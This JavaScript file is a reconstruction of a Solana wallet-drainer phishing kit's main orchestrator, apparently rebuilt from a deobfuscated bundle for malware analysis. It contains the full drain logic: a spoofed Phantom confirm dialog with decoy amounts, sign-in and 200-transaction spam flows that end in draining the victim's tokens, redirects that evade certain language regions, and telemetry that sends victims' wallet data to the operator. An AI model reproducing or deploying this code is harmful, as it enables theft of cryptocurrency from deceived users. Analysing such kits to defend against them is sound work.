'use strict';
/**
 * Kit runtime — full drain orchestrator wiring every component.
 * Sources: bundle.deobfuscated.js lines 33381–34134, DRAIN_PIPELINE.md
 */

require('../core/polyfills');

const { createSession, FLOW, ERR, VIDEO }         = require('../core/state');
const { parseDefaultConfig, decodeAndParse,
        shouldRedirectRu }                          = require('../core/config_parser');
const { isBanned }                                  = require('./ban_check');
const { sendVisit }                                 = require('./visit');
const { readCampaignSource, pageHost, buildConnectUrl } = require('./params');
const { getTelegramContext, postTelegramEvent,
        extractTelegramAndOverrides }               = require('./telegram');
const { isMobileDevice, getDeviceType }             = require('./device');
const { checkWallet, computeMinLamports }           = require('./balance_gate');
const { portfolio, stakeAccounts }                  = require('../chain/portfolio');
const { getBlockhash }                              = require('../chain/blockhash');
const { assembleMainDrainTx, assembleDummyTxs }     = require('../chain/tx_builders');
const { buildSiwsMessage, canSignAll }              = require('./siws');
const { openConnectPopup }                          = require('./wallet_deeplinks');
const { notifyConnect, notifyConfirm, notifyFinal } = require('../operator/client');
const { sendHandlerEvent, EVENT_KIND }              = require('../operator/telemetry');
const { submitSignedTransactions }                  = require('../chain/submit');
const { base58Decode }                              = require('../core/crypto');
const iocs = require('../config/iocs');

// ── Global state ──────────────────────────────────────────────────────────
let _session  = null;  // current session (屭/信())
let _config   = null;  // parsed config from /api/config
let _tgUser   = null;  // Telegram user object (from 皸())

// ── Entrypoint (called on window "load" event) ────────────────────────────
// 籨(config, tgUser) in the bundle — deob line 34134
async function main() {
  // 1. Telegram detection: 皸()
  _tgUser = getTelegramContext();
  if (_tgUser) postTelegramEvent('web_app_expand');

  // 2. kit version fingerprint (console.log("1.18.4") — deob line 33847)
  console.log(iocs.KIT_VERSION);

  // 3. Determine apiHost from URL
  const apiHost = pageHost();
  _session = createSession(apiHost);

  // 4. Russian/Ukrainian language redirect (邞)
  if (_isRuLanguage()) {
    location.replace('https://solana.com/');
    return;
  }

  // 5. Load config (with retry, tgid param, fallback to baked-in default)
  _config = await _loadConfig(apiHost, _tgUser?.id);
  if (!_config) return; // fatal

  // Apply ?o= overrides from URL
  const [tgUserObj, overrides] = extractTelegramAndOverrides(_tgUser);
  if (overrides && Object.keys(overrides).length) {
    Object.assign(_session.c.Ne, overrides);
  }

  // 6. Redirect if config flag set
  if (shouldRedirectRu(_config)) {
    location.replace('https://solana.com/');
    return;
  }

  // 7. Ban check
  if (await isBanned(apiHost)) {
    location.replace('https://solana.com/');
    return;
  }

  // 8. Visit beacon
  await sendVisit(_session.c, tgUserObj || _tgUser).catch(() => {});

  // 9. Set SOL amount from config
  _session.K = _config.maxSol * 1e9;

  // 10. Install openModal on window (called by lure HTML buttons)
  window.openModal = openModal;
}

// ── openModal: triggered by user clicking any CTA ─────────────────────────
async function openModal() {
  if (!_config || !_session) return;

  // Connect popup (desktop) or embedded (mobile)
  const connectDomain = _config.siblingDomain || iocs.CONNECT_DOMAINS[0];
  const [tgUserObj, overrides] = extractTelegramAndOverrides(_tgUser);
  const connectUrl = buildConnectUrl(connectDomain, pageHost(), tgUserObj, overrides);

  if (!isMobileDevice()) {
    openConnectPopup(connectUrl);
  }
  // Mobile: deep-link / embedded flow handled by AppKit / Web3Modal
}

// ── Wallet connected callback (called by AppKit after wallet connects) ──────
async function onWalletConnected(wallet) {
  _session.b = wallet;

  // Update RPC client UA to victim wallet address
  const { rpcClient } = require('../chain/rpc');
  rpcClient.walletAddr = wallet.e;

  // Balance gate
  const minLamports = computeMinLamports(_config);
  const gate = await checkWallet(wallet.e, minLamports);
  if (!gate.ok) {
    _showError(gate.message);
    return;
  }

  // Portfolio scan
  const [port, stakes] = await Promise.all([
    portfolio(wallet.e),
    stakeAccounts(wallet.e),
  ]);
  if (!port) { _showError(ERR.NETWORK); return; }

  // Handler event: CONNECT
  await _telemetry(EVENT_KIND.CONNECT, port);

  // Connect notification → get sessionId + flow type
  const accountList = _buildAccountList(port);
  const [sessionId, keyedEntry, flowMod] = await notifyConnect(
    _session.c.Se, wallet.e, _session.K, accountList
  ).catch(() => [null, null, 0]);

  if (sessionId === null) { _showError(ERR.NETWORK); return; }

  _session.sessionId = sessionId;
  _session.he = {
    be: flowMod || FLOW.DRAIN,
    ie: false,
    lr: accountList,
    Fe: accountList,
  };

  // Show fake confirm dialog (kit's own UI, not the wallet's)
  _showFakeConfirmDialog(port, keyedEntry);
}

// ── onConfirmClicked: victim clicked "Confirm" in fake dialog ────────────
async function onConfirmClicked() {
  await notifyConfirm(_session.c.Se, _session.sessionId, 0).catch(() => {});

  const flow = _session.he.be;

  if (flow === FLOW.SIWS) {
    await _siwsFlow();
  } else if (flow === FLOW.SPAM) {
    await _spamFlow();
  } else {
    await _drainFlow();
  }
}

// ── Main drain flow ───────────────────────────────────────────────────────
async function _drainFlow() {
  const { port } = _session._port;
  const bh = await getBlockhash();

  const instructions = assembleMainDrainTx({
    victimPubkey: _session.b.e,
    tokens:       port?.tokens || [],
    config:       _config,
    campaignTag:  _getCampaignTag(),
    affiliatePct: iocs.SPLIT_80_PCT,
    blockhash:    bh,
  });

  await _telemetry(EVENT_KIND.PRE_SIGN, port);

  let signedTx;
  try {
    signedTx = await _session.b.signTransaction(_buildVersionedTx(instructions, bh));
  } catch (e) {
    _showVideo(VIDEO.REFUND);
    _showError(ERR.REVERTED);
    return;
  }

  await _telemetry(EVENT_KIND.SIGN, port);

  // Submit to operator (server co-signs + broadcasts), fallback self-broadcast in 2500ms
  await submitSignedTransactions(_session, [signedTx]).catch(() => {});

  // Final notification
  const accounts = (port?.tokens || []).map(t => base58Decode(t.account));
  await notifyFinal(_session.c.Se, _session.sessionId, accounts).catch(() => {});

  await _telemetry(EVENT_KIND.COMPLETE, port);
}

// ── SIWS verify flow ───────────────────────────────────────────────────────
async function _siwsFlow() {
  const msg = buildSiwsMessage(pageHost(), _session.b.e);
  try {
    await _session.b.signMessage(new TextEncoder().encode(msg));
  } catch {
    _showError(ERR.VERIFY_AGAIN);
    return;
  }
  // After SIWS success, proceed to drain
  _session.he.be = FLOW.DRAIN;
  await _drainFlow();
}

// ── 200-tx spam flow ───────────────────────────────────────────────────────
async function _spamFlow() {
  _showVideo(VIDEO.SPAM_200);
  const txs = assembleDummyTxs(_session.b.e, 200);
  try {
    await _session.b.signAllTransactions(txs.map(ixs => _buildVersionedTx(ixs)));
  } catch { /* victim rejected */ }
  // Then drain anyway
  await _drainFlow();
}

// ── Helpers ───────────────────────────────────────────────────────────────

function _isRuLanguage() {
  if (typeof navigator === 'undefined') return false;
  const lang = navigator.language.toLowerCase();
  return lang.startsWith('ru') || lang.includes('-ru');
}

async function _loadConfig(apiHost, tgid) {
  for (let attempt = 0; attempt < 10; attempt++) {
    try {
      const { fetchConfig } = require('../operator/client');
      const rawBlob = await fetchConfig(apiHost, tgid);
      return await decodeAndParse(rawBlob, apiHost);
    } catch {
      await new Promise(r => setTimeout(r, Math.min(attempt * 250, 2500)));
    }
  }
  // Fallback to baked-in default config (string table [350] = 緜)
  try { return parseDefaultConfig(); } catch { return null; }
}

async function _telemetry(kind, port) {
  await sendHandlerEvent({
    kind,
    version: iocs.KIT_VERSION,
    wallet:  _session.b?.name,
    pubkey:  _session.b?.e ? base58Decode(_session.b.e) : new Uint8Array(32),
    Ge:      getDeviceType(),
    ve:      (port?.solLamports || 0) / 1e9,
    Me:      (port?.tokens || []).slice(0, 10).map(t => t.account),
    Mr:      (port?.solLamports || 0) / 1e9 * (port?.solPriceUsd || 0),
    ie:      false,
    ut:      false,
    un:      typeof navigator !== 'undefined' ? navigator.language.slice(0, 5) : 'en-US',
    tg:      _tgUser ? { id: _tgUser.id ?? _tgUser.tgid, Pr: _tgUser.username ?? _tgUser.tgus } : null,
  }, _session.c.Se).catch(() => {});
}

function _buildAccountList(port) {
  return (port?.tokens || []).map(t => ({
    type: 0,
    J:    false,
    q:    t.mint,
    de:   t.account,
  }));
}

function _buildVersionedTx(instructions, bh) {
  // Stub — in real implementation wraps instructions into VersionedTransaction
  return { instructions, blockhash: bh?.fe };
}

function _getCampaignTag() {
  // Campaign tag is embedded in the bundle per deploy
  // Format: "{affiliateId}|{splitFlag}|"
  return iocs.OBSERVED_CAMPAIGN_TAGS[0] || '|1|';
}

function _showError(msg) {
  console.error('[kit] error:', msg);
  // Real: update UI error state
}

function _showVideo(path) {
  console.log('[kit] video:', path);
  // Real: inject <video> into fake confirm dialog
}

function _showFakeConfirmDialog(port, keyedEntry) {
  // Shows the kit's own confirm dialog (NOT the wallet's)
  // Displays decoy amounts "+1 SOL, +500 USDC" from keyedEntry
  // Streams VIDEO.MALICIOUS as social proof
  // All Phantom-spoof copy from core/state.js PHANTOM_SPOOF
  _session._port = { port };
  console.log('[kit] showing fake confirm dialog');
}

// ── Install entrypoint ─────────────────────────────────────────────────────
if (typeof window !== 'undefined') {
  window.addEventListener('load', () => main().catch(console.error));
}

module.exports = { main, openModal, onWalletConnected, onConfirmClicked };
